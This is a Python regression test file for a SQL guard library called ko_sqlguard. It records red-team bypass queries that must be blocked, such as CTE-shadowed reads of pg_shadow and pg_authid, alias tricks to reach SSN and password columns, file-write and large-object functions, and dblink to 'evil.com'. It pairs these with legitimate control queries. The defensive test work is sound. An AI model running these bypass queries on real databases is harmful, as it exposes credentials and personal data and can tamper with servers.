"""Regression tests for escapes found by the adversarial red-team workflow.

Each BLOCK payload here is a confirmed escape (a dangerous query that previously
returned PASS/TRANSFORM). The CONTROL payloads must keep passing so the fixes
don't over-block legitimate queries.
"""
from __future__ import annotations

import pytest

from ko_sqlguard import GuardPolicy, Verdict, check

POLICY = GuardPolicy(
    allowed_tables={"orders": [], "customers": ["id", "name", "email"]},
    default_limit=1000,
    max_limit=10000,
)


def _verdict(sql: str) -> Verdict:
    return check(sql, policy=POLICY).verdict


# --- Bug 1: CTE-alias scope confusion -> out-of-allowlist table reads ---

CTE_SCOPE_BYPASS = [
    "SELECT * FROM secrets WHERE id IN (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets)",
    "SELECT secret FROM secrets WHERE id IN (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets)",
    "SELECT s.secret FROM secrets s WHERE s.id IN (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets)",
    "(WITH secrets AS (SELECT 1 a) SELECT a FROM secrets) UNION (SELECT secret FROM secrets)",
    "SELECT passwd FROM pg_shadow WHERE usename IN (WITH pg_shadow AS (SELECT 1) SELECT 1 FROM pg_shadow)",
    "SELECT * FROM pg_authid WHERE rolname IN (WITH pg_authid AS (SELECT 1) SELECT 1 FROM pg_authid)",
    "SELECT * FROM pg_user WHERE usename IN (WITH pg_user AS (SELECT 1) SELECT 1)",
    "SELECT s.secret FROM secrets s, orders o "
    "WHERE s.id=o.id AND o.id IN (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets)",
    "SELECT secret FROM secrets WHERE id = (WITH secrets(id) AS (VALUES(1)) SELECT id FROM secrets)",
    "SELECT * FROM secrets WHERE id NOT IN "
    "(WITH t AS (WITH secrets AS (SELECT 1 id) SELECT id FROM secrets) SELECT id FROM t)",
]


@pytest.mark.parametrize("sql", CTE_SCOPE_BYPASS, ids=lambda s: s[:40])
def test_cte_scope_bypass_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "table_not_allowed" for v in r.violations), [v.code for v in r.violations]


# --- Bug 2: locking reads hidden behind a parenthesized/subquery wrapper ---

LOCK_BYPASS = [
    "(SELECT * FROM orders) FOR UPDATE",
    "(((SELECT * FROM orders))) FOR UPDATE",
    "(SELECT * FROM orders) FOR SHARE",
    "(SELECT * FROM orders) FOR NO KEY UPDATE",
    "(SELECT * FROM orders) FOR KEY SHARE",
    "(SELECT * FROM orders) FOR UPDATE SKIP LOCKED",
    "(SELECT * FROM orders) FOR UPDATE NOWAIT",
    "(SELECT id, name FROM customers) FOR UPDATE",
    "(WITH c AS (SELECT 1) SELECT * FROM orders) FOR UPDATE",
    "(SELECT id FROM customers WHERE id=1) FOR NO KEY UPDATE OF customers",
]


@pytest.mark.parametrize("sql", LOCK_BYPASS, ids=lambda s: s[:40])
def test_locking_read_bypass_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "locking_read" for v in r.violations), [v.code for v in r.violations]


# --- Bug 3: dangerous functions missing from the default blocklist ---

DANGEROUS_FUNCTIONS = [
    "SELECT pg_file_write('/tmp/x', 'data', false)",
    "SELECT pg_file_unlink('/tmp/x')",
    "SELECT pg_file_rename('/a','/b')",
    "SELECT lo_put(1, 0, 'x')",
    "SELECT lo_get(16384)",
    "SELECT lo_from_bytea(0, 'abc')",
    "SELECT lo_creat(-1)",
    "SELECT lo_unlink(1)",
    "SELECT loread(lo_open(1234, 262144), 100000)",
    "SELECT pg_ls_logdir()",
    "SELECT pg_ls_waldir()",
    "SELECT pg_ls_tmpdir()",
    "SELECT pg_logdir_ls()",
    "SELECT pg_stat_get_activity(NULL)",
    "SELECT current_setting('is_superuser')",
    "SELECT setval('orders_id_seq', 999999999)",
    "SELECT nextval('seq')",
    "SELECT pg_advisory_lock(1)",
    "SELECT pg_advisory_xact_lock(42)",
    "SELECT pg_promote()",
    "SELECT pg_switch_wal()",
    "SELECT pg_drop_replication_slot('s')",
    "SELECT pg_create_restore_point('x')",
    "SELECT pg_backup_start('x')",
    "SELECT pg_stat_reset()",
    "SELECT pg_relation_filepath('orders')",
    "SELECT pg_current_logfile()",
    "SELECT inet_server_addr(), inet_server_port()",
    "SELECT pg_database_size('postgres')",
    "SELECT dblink_connect_u('h', 'host=evil.com user=postgres')",
    "SELECT dblink_send_query('conn', 'SELECT * FROM secrets')",
    "SELECT dblink_get_result('conn')",
    "SELECT query_to_xmlschema('SELECT * FROM secrets', true, true, '')",
    "SELECT convert_from(lo_get(1), 'UTF8')",
    "SELECT * FROM orders WHERE id = (SELECT lo_get(1))",
]


@pytest.mark.parametrize("sql", DANGEROUS_FUNCTIONS, ids=lambda s: s[:40])
def test_dangerous_function_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "blocked_function" for v in r.violations), [v.code for v in r.violations]


# --- Bug 4: FETCH FIRST is a LIMIT equivalent and must be capped ---

def test_fetch_first_is_capped() -> None:
    r = check("SELECT * FROM orders FETCH FIRST 1000000000 ROWS ONLY", policy=POLICY)
    assert r.verdict is Verdict.TRANSFORM
    assert any(v.code == "limit_capped" for v in r.violations), [v.code for v in r.violations]
    assert "1000000000" not in (r.sql or "")


def test_reasonable_fetch_first_left_alone() -> None:
    r = check("SELECT * FROM orders FETCH FIRST 50 ROWS ONLY", policy=POLICY)
    assert not any(v.code == "limit_capped" for v in r.violations)


# --- Controls: fixes must NOT over-block legitimate queries ---

CONTROLS_OK = [
    "WITH secrets AS (SELECT 1 id) SELECT * FROM secrets",   # benign same-scope CTE shadow
    "WITH r AS (SELECT * FROM orders) SELECT * FROM r",      # normal CTE over allowed table
    "SELECT id, name FROM customers WHERE id = 1",
    "SELECT generate_series(1, 100)",                        # legit set-returning function
    "SELECT repeat('-', 10)",                                # legit string function
    "SELECT count(*) FROM orders",
    "SELECT o.id FROM orders o JOIN customers c ON o.id = c.id",
]


@pytest.mark.parametrize("sql", CONTROLS_OK, ids=lambda s: s[:40])
def test_controls_still_allowed(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is not Verdict.BLOCK, [v.model_dump() for v in r.violations]


# --- Bug 5: table-alias column-allowlist bypass (round 2 red-team) ---

ALIAS_COLUMN_BYPASS = [
    "SELECT c.ssn FROM customers c",
    "SELECT c.password FROM customers c",
    "SELECT cu.password_hash FROM customers cu LIMIT 10",
    "SELECT c.ssn FROM orders o JOIN customers c ON o.id = c.id WHERE o.id = 1",
    "SELECT c.* FROM customers c",
]


@pytest.mark.parametrize("sql", ALIAS_COLUMN_BYPASS, ids=lambda s: s[:40])
def test_alias_column_bypass_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "column_not_allowed" for v in r.violations), [v.code for v in r.violations]


def test_alias_allowed_columns_still_pass() -> None:
    # 별칭을 써도 허용 컬럼은 통과해야 (과탐 방지).
    assert check("SELECT c.id, c.name FROM customers c", policy=POLICY).verdict is not Verdict.BLOCK
    assert check("SELECT o.total FROM orders o", policy=POLICY).verdict is not Verdict.BLOCK


def test_pg_get_userbyid_blocks() -> None:
    r = check("SELECT pg_get_userbyid(10)", policy=POLICY)
    assert r.verdict is Verdict.BLOCK
    assert any(v.code == "blocked_function" for v in r.violations)


# --- round-3: alias registration broke single-table judgement (false positives) ---

ROUND3_NO_FALSE_POSITIVE = [
    "SELECT id FROM customers c",
    "SELECT name FROM customers c ORDER BY name",
    "SELECT count(*) FROM customers",
    "SELECT count(*) AS n, c.email FROM customers c GROUP BY c.email",
    "SELECT c.email FROM customers c WHERE c.id = 1",
]


@pytest.mark.parametrize("sql", ROUND3_NO_FALSE_POSITIVE, ids=lambda s: s[:40])
def test_round3_no_false_positive(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is not Verdict.BLOCK, [v.model_dump() for v in r.violations]


# --- round-3: introspection / privilege / xml / sequence functions ---

ROUND3_FUNCTIONS = [
    "SELECT to_regclass('secrets')",
    "SELECT to_regnamespace('pg_catalog')",
    "SELECT has_table_privilege('secrets', 'SELECT')",
    "SELECT has_column_privilege('customers', 'ssn', 'SELECT')",
    "SELECT pg_has_role('postgres', 'USAGE')",
    "SELECT schema_to_xml('public', true, true, '')",
    "SELECT currval('orders_id_seq')",
    "SELECT pg_get_viewdef('v'::regclass)",
    "SELECT pg_export_snapshot()",
]


@pytest.mark.parametrize("sql", ROUND3_FUNCTIONS, ids=lambda s: s[:40])
def test_round3_function_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "blocked_function" for v in r.violations), [v.code for v in r.violations]


# --- round-4: derived-table (subquery) alias columns resolved to real source ---

def test_derived_table_disallowed_inner_blocks() -> None:
    # inner projects a disallowed column -> BLOCK.
    r = check("SELECT x.c FROM (SELECT ssn FROM customers) x(c)", policy=POLICY)
    assert r.verdict is Verdict.BLOCK
    assert any(v.code == "column_not_allowed" for v in r.violations)


DERIVED_TABLE_OK = [
    "SELECT x.ssn FROM (SELECT id FROM customers) x(ssn)",   # allowed id re-named: data is id
    "SELECT x.id FROM (SELECT id FROM customers) x",
    "SELECT x.total FROM (SELECT price FROM orders) x(total)",  # orders all-columns allowed
    "SELECT x.computed FROM (SELECT id + 1 AS computed FROM customers) x",  # computed: not a real col
]


@pytest.mark.parametrize("sql", DERIVED_TABLE_OK, ids=lambda s: s[:40])
def test_derived_table_allowed_passes(sql: str) -> None:
    # 허용 컬럼을 다른 이름으로 재노출하거나 계산식이면 통과(실 데이터가 허용/계산).
    assert check(sql, policy=POLICY).verdict is not Verdict.BLOCK, sql


# --- round-4: MERGE per-WHEN-action privilege gating ---

_MERGE_RW = GuardPolicy(read_only=False, allow_update=True, allowed_tables=None)
_MERGE_DEL = GuardPolicy(
    read_only=False, allow_update=True, allow_delete=True, allowed_tables=None
)

MERGE_ESCALATION = [
    # DELETE action parses to Var('DELETE'); a single allow_update gate let it escalate.
    "MERGE INTO orders o USING customers c ON o.id=c.id WHEN MATCHED THEN DELETE",
    "MERGE INTO orders o USING customers c ON o.id=c.id "
    "WHEN MATCHED AND o.total < 0 THEN DELETE",
    # INSERT action with only allow_update must block too.
    "MERGE INTO orders o USING src s ON o.id=s.id WHEN NOT MATCHED THEN INSERT VALUES (s.id)",
]


@pytest.mark.parametrize("sql", MERGE_ESCALATION, ids=lambda s: s[:40])
def test_merge_action_escalation_blocks(sql: str) -> None:
    r = check(sql, policy=_MERGE_RW)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "statement_type" for v in r.violations), [v.code for v in r.violations]


def test_merge_update_with_permission_passes() -> None:
    # allow_update면 MERGE UPDATE는 통과해야 — ON 조건이 행을 스코프(missing_where 과탐 금지).
    sql = "MERGE INTO orders o USING src s ON o.id=s.id WHEN MATCHED THEN UPDATE SET o.x=1"
    assert check(sql, policy=_MERGE_RW).verdict is not Verdict.BLOCK


def test_merge_delete_with_permission_passes() -> None:
    sql = "MERGE INTO orders o USING customers c ON o.id=c.id WHEN MATCHED THEN DELETE"
    assert check(sql, policy=_MERGE_DEL).verdict is not Verdict.BLOCK


def test_plain_update_without_where_still_blocks() -> None:
    # MERGE 면제가 일반 WHERE-less UPDATE 까지 풀어주면 안 됨.
    r = check("UPDATE orders SET x=1", policy=_MERGE_RW)
    assert r.verdict is Verdict.BLOCK
    assert any(v.code == "missing_where" for v in r.violations)


# --- round-4: catalog/replication/identity introspection functions ---

ROUND4_FUNCTIONS = [
    "SELECT pg_relation_filenode('orders')",
    "SELECT pg_relation_size('orders')",
    "SELECT pg_total_relation_size('orders')",
    "SELECT pg_tablespace_location(1663)",
    "SELECT pg_filenode_relation(0, 16384)",
    "SELECT pg_stat_reset_single_table_counters(16384)",
    "SELECT pg_stat_get_backend_activity(1)",
    "SELECT pg_replication_slot_advance('s', '0/0')",
    "SELECT pg_logical_emit_message(true, 'p', 'm')",
    "SELECT pg_wal_replay_pause()",
    "SELECT pg_control_system()",
    "SELECT pg_describe_object(1259, 16384, 0)",
    "SELECT pg_identify_object(1259, 16384, 0)",
    "SELECT pg_get_object_address('table', '{orders}', '{}')",
    "SELECT pg_get_function_arguments(16384)",
    "SELECT pg_get_function_result(16384)",
    "SELECT row_security_active('orders')",
    "SELECT pg_try_advisory_lock_shared(1)",
]


@pytest.mark.parametrize("sql", ROUND4_FUNCTIONS, ids=lambda s: s[:40])
def test_round4_function_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "blocked_function" for v in r.violations), [v.code for v in r.violations]


# --- round-5: CTE/alias name-collision bypasses the column allowlist ---

CTE_ALIAS_COLLISION = [
    # a CTE whose name equals the restricted table's ALIAS poisons cte_aliases, so the
    # qualified column was skipped — but FROM's alias shadows the CTE per SQL scope.
    "WITH c AS (SELECT 1 AS id) SELECT c.ssn FROM customers c LIMIT 10",
    "WITH cust AS (SELECT 1) SELECT cust.ssn, cust.password, cust.dob FROM customers AS cust LIMIT 5",
    "WITH c AS (SELECT 1 AS id) SELECT c.ssn FROM orders o JOIN customers c "
    "ON o.cid = c.id UNION SELECT id::text FROM orders",
    # quoted upper-case alias whose qualifier does not resolve -> fail-closed.
    'SELECT C.ssn FROM customers "C"',
]


@pytest.mark.parametrize("sql", CTE_ALIAS_COLLISION, ids=lambda s: s[:40])
def test_cte_alias_collision_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "column_not_allowed" for v in r.violations), [v.code for v in r.violations]


ROUND5_COLUMN_OK = [
    # genuine CTE column (CTE name not a restricted real table) still passes.
    "WITH c AS (SELECT 1 AS foo) SELECT c.foo FROM c",
    "WITH r AS (SELECT id, name FROM customers) SELECT r.id, r.name FROM r",
    # round-6: unqualified columns in a mixed join are now fail-closed (see
    # test_unqualified_join_fail_closed_blocks); the legitimate read must QUALIFY.
    "SELECT sum(o.total) OVER () FROM orders o JOIN customers c ON o.id = c.id",
    "SELECT o.total FROM orders o JOIN customers c ON o.id = c.id",
    # CTE named after the real TABLE (no alias): FROM resolves the CTE, real table
    # is never read (customers.ssn is a non-existent CTE column) -> no leak, allowed.
    "WITH customers AS (SELECT 1) SELECT customers.ssn FROM customers",
]


@pytest.mark.parametrize("sql", ROUND5_COLUMN_OK, ids=lambda s: s[:40])
def test_round5_column_no_false_positive(sql: str) -> None:
    assert check(sql, policy=POLICY).verdict is not Verdict.BLOCK, sql


# --- round-5: ::reg* casts are catalog probes (equivalent to to_reg*()) ---

REG_CAST_BLOCK = [
    "SELECT 'pg_authid'::regclass FROM orders LIMIT 1",
    "SELECT 'postgres'::regrole::oid FROM orders LIMIT 1",
    "SELECT 'customers'::regclass::oid",
    "SELECT 'pg_read_file'::regproc",
    "SELECT 'public'::regnamespace",
]


@pytest.mark.parametrize("sql", REG_CAST_BLOCK, ids=lambda s: s[:40])
def test_reg_cast_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "blocked_function" for v in r.violations), [v.code for v in r.violations]


def test_ordinary_cast_not_blocked() -> None:
    # 일반 캐스트는 막지 않아야(과탐 방지).
    assert check("SELECT id::text FROM orders", policy=POLICY).verdict is not Verdict.BLOCK
    assert check("SELECT count(*)::int FROM orders", policy=POLICY).verdict is not Verdict.BLOCK


# --- round-5: INSERT ... ON CONFLICT DO UPDATE is an UPDATE; gate by allow_update ---

_INS = GuardPolicy(allowed_tables=None, read_only=False, allow_insert=True, allow_update=False)
_UPD = GuardPolicy(allowed_tables=None, read_only=False, allow_insert=True, allow_update=True)

ON_CONFLICT_UPDATE = [
    "INSERT INTO orders (id) VALUES (1) ON CONFLICT (id) DO UPDATE SET total=99",
    "WITH src AS (SELECT 1 AS id) INSERT INTO orders (id) SELECT id FROM src "
    "ON CONFLICT (id) DO UPDATE SET total=2",
]


@pytest.mark.parametrize("sql", ON_CONFLICT_UPDATE, ids=lambda s: s[:40])
def test_on_conflict_do_update_blocks_without_allow_update(sql: str) -> None:
    r = check(sql, policy=_INS)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "statement_type" for v in r.violations), [v.code for v in r.violations]


def test_on_conflict_do_nothing_allowed() -> None:
    sql = "INSERT INTO orders (id) VALUES (1) ON CONFLICT (id) DO NOTHING"
    assert check(sql, policy=_INS).verdict is not Verdict.BLOCK


def test_on_conflict_do_update_allowed_with_permission() -> None:
    sql = "INSERT INTO orders (id) VALUES (1) ON CONFLICT (id) DO UPDATE SET total=9"
    assert check(sql, policy=_UPD).verdict is not Verdict.BLOCK


# --- round-5: MERGE is write/lock-class; block any MERGE under read_only ---

def test_merge_do_nothing_blocks_in_read_only() -> None:
    sql = "MERGE INTO orders o USING customers c ON o.id=c.id WHEN MATCHED THEN DO NOTHING"
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK
    assert any(v.code == "statement_type" for v in r.violations), [v.code for v in r.violations]


# --- round-6: unqualified-column fail-open in mixed joins (the round-5 has_unrestricted gap) ---

UNQUALIFIED_JOIN_LEAK = [
    "SELECT ssn FROM customers JOIN orders ON customers.id = orders.id LIMIT 50",
    "SELECT ssn FROM customers JOIN orders USING (id)",
    "SELECT ssn FROM customers JOIN (SELECT id FROM orders) o ON customers.id = o.id",
    "SELECT ssn, name, email FROM customers JOIN orders USING (id)",
    # JOIN ... USING (ssn): the USING column is itself a disallowed customers column.
    "SELECT id FROM customers c JOIN orders o USING (id) JOIN customers c2 USING (ssn)",
]


@pytest.mark.parametrize("sql", UNQUALIFIED_JOIN_LEAK, ids=lambda s: s[:40])
def test_unqualified_join_fail_closed_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "column_not_allowed" for v in r.violations), [v.code for v in r.violations]


# --- round-6: whole-row references serialize every column of a restricted table ---

WHOLE_ROW_LEAK = [
    "SELECT to_jsonb(c) FROM customers c JOIN orders o ON c.id=o.id",
    "SELECT array_agg(c) FROM customers c",
    "SELECT to_jsonb(customers) FROM customers JOIN orders o ON customers.id=o.id",
    "SELECT j FROM (SELECT to_jsonb(c) j FROM customers c JOIN orders o ON c.id=o.id) s",
    "SELECT row_to_json(c) FROM customers c",
]


@pytest.mark.parametrize("sql", WHOLE_ROW_LEAK, ids=lambda s: s[:40])
def test_whole_row_reference_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "column_not_allowed" for v in r.violations), [v.code for v in r.violations]


# --- round-6: catalog/config functions usable as a FROM/LATERAL source + pg_notify ---

ROUND6_FUNCTIONS = [
    "SELECT k.word FROM orders o JOIN LATERAL pg_get_keywords() k ON k.word = o.status",
    "SELECT c.name FROM orders o JOIN LATERAL pg_config() c ON c.name = o.status",
    "SELECT pg_notify('attacker_channel', 'exfil:secret')",
    "SELECT pg_notify('c','p') FROM orders LIMIT 1",
]


@pytest.mark.parametrize("sql", ROUND6_FUNCTIONS, ids=lambda s: s[:40])
def test_round6_function_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "blocked_function" for v in r.violations), [v.code for v in r.violations]


def test_round6_qualified_reads_still_pass() -> None:
    # fail-closed 전환이 정상 qualified 읽기를 막지 않아야(과탐 방지).
    for sql in (
        "SELECT id FROM customers JOIN orders USING (id)",
        "SELECT c.id, c.name FROM customers c JOIN orders o ON c.id=o.id",
        "SELECT o.total FROM orders o JOIN customers c ON o.id=c.id",
        "SELECT generate_series(1,10)",
    ):
        assert check(sql, policy=POLICY).verdict is not Verdict.BLOCK, sql


# --- LATERAL joins: legit correlated lookups must not over-block (false-positive sweep) ---

LATERAL_OK = [
    "SELECT c.id, c.name, lo.total FROM customers c CROSS JOIN LATERAL "
    "(SELECT o.total FROM orders o WHERE o.customer_id = c.id ORDER BY o.id DESC LIMIT 1) lo",
    "SELECT c.name, lo.total FROM customers c LEFT JOIN LATERAL "
    "(SELECT o.total FROM orders o WHERE o.customer_id = c.id LIMIT 1) lo ON true",
    "SELECT c.id, recent.total FROM customers c JOIN LATERAL "
    "(SELECT o.total FROM orders o WHERE o.customer_id = c.id LIMIT 1) recent ON true",
]


@pytest.mark.parametrize("sql", LATERAL_OK, ids=lambda s: s[:40])
def test_lateral_legit_not_blocked(sql: str) -> None:
    # LATERAL alias 등록 + ON true / CROSS LATERAL 예외 — 정상 상관 조회는 통과.
    assert check(sql, policy=POLICY).verdict is not Verdict.BLOCK, sql


def test_lateral_disallowed_column_still_blocks() -> None:
    # LATERAL 안에서 금지 컬럼(ssn)을 노리면 여전히 차단되어야(derived 환원).
    sql = ("SELECT c.name, bad.ssn FROM customers c LEFT JOIN LATERAL "
           "(SELECT cu.ssn FROM customers cu WHERE cu.id = c.id LIMIT 1) bad ON true")
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK
    assert any(v.code == "column_not_allowed" for v in r.violations)


# --- star over a non-restricted table is allowed; over a restricted table blocks ---

def test_star_over_unrestricted_table_allowed() -> None:
    # orders 는 전컬럼 허용([]) → 'SELECT *' 노출 위험 없음(과탐 방지).
    for sql in (
        "SELECT * FROM orders",
        "SELECT * FROM orders o WHERE o.id = 1",
        "WITH a AS (SELECT * FROM orders), b AS (SELECT id, name FROM customers) "
        "SELECT a.id FROM a JOIN b ON a.id = b.id",
    ):
        assert check(sql, policy=POLICY).verdict is not Verdict.BLOCK, sql


STAR_OVER_RESTRICTED = [
    "SELECT * FROM customers",
    "SELECT c.* FROM customers c",
    "SELECT * FROM orders o JOIN customers c ON o.id = c.id",
    "SELECT c.* FROM orders o JOIN customers c ON o.id = c.id",
]


@pytest.mark.parametrize("sql", STAR_OVER_RESTRICTED, ids=lambda s: s[:40])
def test_star_over_restricted_table_blocks(sql: str) -> None:
    r = check(sql, policy=POLICY)
    assert r.verdict is Verdict.BLOCK, sql
    assert any(v.code == "column_not_allowed" for v in r.violations), [v.code for v in r.violations]
